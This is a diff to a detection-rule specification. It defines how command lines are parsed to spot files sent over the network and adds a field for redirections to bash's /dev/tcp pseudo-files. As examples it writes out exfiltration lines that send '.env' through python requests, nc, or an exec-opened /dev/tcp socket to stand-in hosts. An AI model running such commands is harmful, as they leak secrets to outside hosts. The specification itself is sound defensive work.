@@ -79,7 +79,7 @@ Exactly one of `match` or `correlation` must be present. Required:
 | Field | Required | Type / values | Meaning |
 |---|---|---|---|
 | `id` | yes | string `^[a-z0-9][a-z0-9-]*$` | Stable unique identity. Unique across the pack. Flows to `policy.id` on a finding. |
-| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `file_reads` and `script_sends`. See [Versioning](#versioning). |
+| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `file_reads`, `script_sends` and `socket_redirects`, and for a call to a [predicate](#predicates). See [Versioning](#versioning). |
 | `version` | yes | int ≥ 1 | Rule content revision; bump on logic change. |
 | `title` | yes | string | Human-readable name. Flows to `policy.name`. |
 | `description` | no | string | Documentation only; never evaluated. |
@@ -202,7 +202,8 @@ the steps in both orders still fires once. A single event never satisfies two st
   assignments before the command, `""` for an unknown value), `file_effects` (the files the
   command evidently writes, `{path, op}`, of the command `name` names), `file_reads` and
   `script_sends` (the files it evidently takes as input and the ones its inline script
-  sends, below), `pipeline` (shared by the stages of one
+  sends, below), `socket_redirects` (its redirections to a network pseudo-file, below),
+  `pipeline` (shared by the stages of one
   pipeline), `stage` (0-based position in it; a command inside a compound stage such as
   `{ a; b; } | c` or `(a) | c` carries that stage unless it is a stage of an inner pipeline
   or inside a substitution) and `nested` (inside a command or process
@@ -267,24 +268,47 @@ the steps in both orders still fires once. A single event never satisfies two st
       `IO.read|readlines|binread|foreach` (ruby), and `file_get_contents`, `fopen`, `readfile`
       and `file` (php). A call whose mode argument holds `w`, `a` or `x` is not a read.
       `script_sends` (since v1.3, with the same declaration rule) lists the paths of those the
-      script opens inside the parentheses of a call that sends its arguments over the network,
-      at any depth: `.env` for `requests.post(url, data=open(".env").read())`. The calls are,
-      by their last name, `post`, `put`, `patch`, `request`, `urlopen`, `Request`, `send`,
-      `sendall` and `sendto` (python); `fetch`, `axios`, `post`, `put`, `patch`, `request`,
-      `send`, `sendBeacon`, `connect` and `createConnection`, and `.end(..)` or `.write(..)`
-      called directly on what one of them returns (JavaScript); `post`, `post_form`, `put`,
-      `patch`, and `.write`, `.puts`, `.print` or `.send` called directly on `TCPSocket.new(..)`
-      or `TCPSocket.open(..)` (ruby); `curl_setopt`, `curl_setopt_array`,
-      `stream_context_create`, `socket_write`, `socket_send` and `mail` (php). A file read into
-      a variable that is sent later is a read and not a send. For a command that is not such
-      an interpreter the list is empty: whether `curl` or `nc` sends what it takes in is for
-      the rule to say.
+      script sends over the network: a file it opens inside the parentheses of a call that
+      sends its arguments, at any depth (`.env` for
+      `requests.post(url, data=open(".env").read())`), or one whose content a name holds when
+      the name is used there (`d = open(".env").read(); requests.post(url, data=d)`). The
+      calls are, by their last name, `post`, `put`, `patch`, `request`, `urlopen`, `Request`,
+      `send`, `sendall` and `sendto` (python); `fetch`, `axios`, `post`, `put`, `patch`,
+      `request`, `send`, `sendBeacon`, `connect` and `createConnection`, and `.end(..)` or
+      `.write(..)` called on what one of them returns (JavaScript); `post`, `post_form`, `put`,
+      `patch`, and `.write`, `.puts`, `.print` or `.send` called on what `TCPSocket.new(..)` or
+      `TCPSocket.open(..)` returns (ruby); `curl_setopt`, `curl_setopt_array`,
+      `stream_context_create`, `socket_write`, `socket_send` and `mail` (php). "What one of
+      them returns" is the call itself (`https.request(url).end(data)`) or a name assigned it
+      (`r = https.request(url); r.write(data)`).
+
+      A name holds a file's content when it is assigned a value that opens the file or uses a
+      name that holds it (`name = value`, to the end of the statement: a newline or `;`
+      outside parentheses), until it is assigned again; when it follows `as` in a statement
+      that opened the file (python `with open(..) as f`); when it is a parameter of a callback
+      in a statement that opened it (JavaScript `(err, data) =>`, `data =>`,
+      `function (err, data)`); or when it is a parameter of a block there (ruby `{ |f|`,
+      `do |f|`). A use of `name.member` is a use of `name`. In python `name=value` inside a
+      call's parentheses is an argument and assigns nothing. A name directly before `:` is a
+      key and not a use. Scopes, what a function returns, a loop variable, and a value inside
+      a string (an f-string, a template literal) are not followed.
+
+      As for `curl`, a call's headers, credentials and URL parameters are not data. Inside a
+      call that sends, nothing counts from the name `headers`, `auth`, `params` or `cert`
+      (python), `headers`, `auth` or `params` (JavaScript), `headers`, `basic_auth` or `query`
+      (ruby), written as `name=` or `name:`, to the next comma at the same depth of
+      parentheses, braces and brackets; nor from `CURLOPT_HTTPHEADER`, `CURLOPT_USERPWD`,
+      `CURLOPT_URL` or `CURLOPT_XOAUTH2_BEARER` (php) to the end of the call.
+
+      For a command that is not such an interpreter the list is empty: whether `curl` or `nc`
+      sends what it takes in is for the rule to say.
 
     The value of an option is never an operand (`head -n 5`, `scp -i key`, `tar --exclude x`,
     `gh gist create -d text`).
   - `stdin`: the content arrives on the command's standard input: the target of its `<` or
-    `<>` redirection, what a substitution in its here-string wrote, or what the stage before
-    it in its pipeline writes to the pipe.
+    `<>` redirection, what a substitution or a variable in its here-string or in the body of
+    its here-document wrote (a here-document whose delimiter is quoted expands nothing), or
+    what the stage before it in its pipeline writes to the pipe.
   - `argument`: the content is written into one of the command's words by a command
     substitution, an input process substitution (`<(..)`), or a variable assigned from one
     earlier in the command line. For `curl`, `wget`, `http`, `https`, `httpie`, `xh` and `xhs`
@@ -301,17 +325,43 @@ the steps in both orders still fires once. A single event never satisfies two st
   directly inside it writes. A variable holds what the substitutions and variables in its
   value hold, when it is assigned by a statement of assignments only or by `export`, `declare`,
   `local`, `readonly` or `typeset`; an assignment before a command is that command's
-  environment and is not followed. A file written earlier in the command line holds what the
+  environment and is followed only into a script the command runs (below). A file written earlier in the command line holds what the
   command that wrote it took in (the target of `>` and `>>`, the destination of `cp` and
   `install`, the files of `tee`) or what the file moved onto it held (`mv`), until it is
   written with something else, truncated or deleted; reading it takes that in too, by the
   same `via`. Paths are compared as written.
 
-  Standard input (`-`) and paths under `/dev/` are left out. The body of a here-document
-  that is not a script is not followed, nor is what a script does with a file through a
-  variable, nor data that crosses the boundary of a shell's script (`bash -c 'cat .env' | nc
-  ..` reports the read on `cat`, not on `nc`). The reference derivation is
-  `shellcmd.FileReads`.
+  The data is followed across the boundary of a script that is read as commands (a shell's
+  `-c` text, or the here-document or here-string it reads its script from). The shell writes
+  what the last stage of each pipeline directly in its script writes, in place of what the
+  shell itself took in, so in `bash -c 'cat .env' | nc ..` the read is on `cat` and, by
+  `stdin`, on `nc`. A first stage directly in the script takes in by `stdin` what the shell
+  took in by `stdin`, unless a redirection of its own supplies its standard input. A variable
+  belongs to the shell that assigned it: a script reads its own, those of the `NAME=value`
+  prefix of the shell that runs it, and those a shell it was started from assigned with
+  `export` or named in a later `export NAME`; a script's variables do not leave it. Files
+  written are shared.
+
+  Standard input (`-`) and paths under `/dev/` are left out. The literal text of a
+  here-document that is not a script is not read as commands, and what a script of another
+  language does with a file through a variable is not followed. A shell that reads its
+  script from a here-document takes in what the body expands, and its script's commands do
+  not read that as their standard input. The reference derivation is `shellcmd.FileReads`
+  over `shellcmd.WithScripts`.
+- `socket_redirects` (since v1.3; a rule that selects it MUST declare
+  `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` lists the
+  command's redirections to or from bash's network pseudo-files, each `{path, op}`. `path` is
+  the target as written without its quotes, when it begins `/dev/tcp/` or `/dev/udp/` and
+  names something after it: `/dev/tcp/host.example/4444`, and `/dev/tcp/$HOST/$PORT` as
+  written. `op` is `write` for `>`, `>>`, `>|`, `&>`, `&>>` and `>&`, `read` for `<` and
+  `<&`, and `readwrite` for `<>`. A redirection that duplicates a descriptor (`>&3`, `<&3`)
+  is one when an earlier `exec` with no command, in the same shell or in the one that started
+  this subshell or substitution, left that descriptor open on a pseudo-file: its `path` is
+  that pseudo-file and its `op` the direction of the duplication, so in
+  `exec 3<>/dev/tcp/h/1; cat .env >&3` the `exec` entry has `{/dev/tcp/h/1, readwrite}` and
+  the `cat` entry `{/dev/tcp/h/1, write}`. A later `exec` that closes the descriptor or
+  points it elsewhere ends that. The same path as a word of a command is not a redirection.
+  The reference derivation is `shellcmd.SocketRedirects`.
 - `e.system_context` is on the wire, not derived: on `session.context` it names what the
   runtime gave the model. `kind` is `skill_listing` for a skill index, `source` is where
   Beacon read it (`system_prompt`, `transcript`), and `skills` names each listed skill as
@@ -424,8 +474,12 @@ over anything but whitespace and quotes. A pattern of one component without a `.
 word such as `credentials`) counts only directly after a separator. A store with `exclude`
 patterns is not mentioned by a text that also names something those patterns match.
 `redacted` is for a command line as a log holds it. A log's redaction replaces a value that
-looks like a secret, and the value of `TOKEN=$(gh auth token)` begins with the command's
-name, so the log holds `TOKEN=[REDACTED] auth token)`. The predicate is true when the text
+looks like a secret, and where a command substitution is put in a secret's place the value
+can begin with the command's name: of `curl -u "ci:$(gh auth token)"` the log holds
+`curl -u "ci:[REDACTED] auth token)"`. (A Beacon before the release that introduced v1.3
+also wrote `TOKEN=[REDACTED] auth token)` for `TOKEN=$(gh auth token)`; redaction now keeps
+the opening of a substitution after a label, and that line is logged as written.) The
+predicate is true when the text
 holds `[REDACTED]`, whitespace, and then, within the same command, an entry's `words` in
 order and one of its `flags`. An entry has this form only when what is left tells the
 command from another: two `words` or more, one word with `flags`, one word that is more than
@@ -498,7 +552,8 @@ v1.1 field, as an unknown field, and refuse the directory that contains it.
 
 ### Changelog
 
-- **v1.3**: `args`, `file_reads` and `script_sends` on each entry of `e.command.parsed_commands`.
+- **v1.3**: `args`, `file_reads`, `script_sends` and `socket_redirects` on each entry of
+  `e.command.parsed_commands`.
   `name` and `file_effects` find the command behind `timeout`, `nice`, `ionice`, `stdbuf`,
   `doas`, `torsocks` and `proxychains`, without a Windows executable's suffix and after a
   PowerShell assignment, and a shell's here-document or here-string script, and a PowerShell's
